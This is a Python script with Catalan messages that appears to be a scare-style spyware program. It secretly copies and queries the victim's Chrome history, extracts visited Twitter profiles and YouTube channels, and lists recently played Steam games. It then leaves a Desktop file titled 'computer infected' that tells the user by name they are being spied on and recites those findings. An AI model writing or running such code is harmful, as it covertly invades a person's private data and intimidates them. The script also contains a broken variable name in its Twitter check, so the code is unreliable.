import os
import time
import random
import sqlite3
from pathlib import Path
import re
import glob
from shutil import copyfile

HACKER_FILE_NAME = "ORDINADOR INFECTAT!!.txt"

def delay_action(timer):
    print(timer)
    time.sleep(timer)

def get_user_path():
    return "{}/".format(Path.home())


def create_file(user_path):
    file_path = user_path + "/Desktop/"
    arxiu = open(file_path + HACKER_FILE_NAME, "w")
    user_name = os.getlogin()
    arxiu.write("Això és un missatge per a {}.\nT'estic espiant.\n".format(user_name))
    return arxiu


def get_chrome_history(user_path):
    urls = None
    while not urls:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            temp_history_path = history_path + "temp"
            copyfile(history_path,temp_history_path)
            connection = sqlite3.connect(temp_history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            os.remove(temp_history_path)
            return urls


def check_twitter_profiles_chrome_history(arxiu, user_history):
    visited_profiles = []
    for item in user_history[:9]:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["home","notifications"]:
            profiles_visited.append(results[0])
    if visited_profiles == []:
        return
    arxiu.write("\nHe vist que has visitat els perfils de Twitter de {}... interessant...".format(",".join(visited_profiles)))

def check_youtube_channels_chrome_history(arxiu, user_history):
    visited_profiles = []
    for item in user_history:
        results = re.findall("https://www.youtube.com/c/([A-Za-z0-9]+)$", item[2])
        if results:
            visited_profiles.append(results[0])
    if visited_profiles == []:
        return
    arxiu.write("\nA més, veig que has visitat els canals de YouTube {}... interessant...".format(", ".join(visited_profiles)))

def check_steam_games(arxiu):
    steam_path = "C:/Program Files (x86)/Steam/steamapps/common/*"
    games = []
    steam_folder_games = glob.glob(steam_path)
    if steam_folder_games == []:
        return
    steam_folder_games.sort(key=os.path.getmtime, reverse=True)
    for game in steam_folder_games:
        if game.split("\\")[-1] not in ["Steamworks Shared", "Steam Controller Configs"]:
            games.append(game.split("\\")[-1])
    arxiu.write("\nTambé sé que has jugat a {}...".format(", ".join(games[:3])))
def main():


    # Wait for some time
    "delay_action(random.randrange(1,3) * 60 * 60 + random.randint(1,60) * 60)"
    # Get user path
    user_path = get_user_path()
    # Get google chrome history
    user_history = get_chrome_history(user_path)
    # Create a file in user's Desktop
    arxiu = create_file(user_path)
    # Check history for twitter profiles
    check_twitter_profiles_chrome_history(arxiu, user_history)
    # Check history for youtube channels
    check_youtube_channels_chrome_history(arxiu, user_history)
    # Check steam games in computer
    check_steam_games(arxiu)


if __name__ == "__main__":
    main()

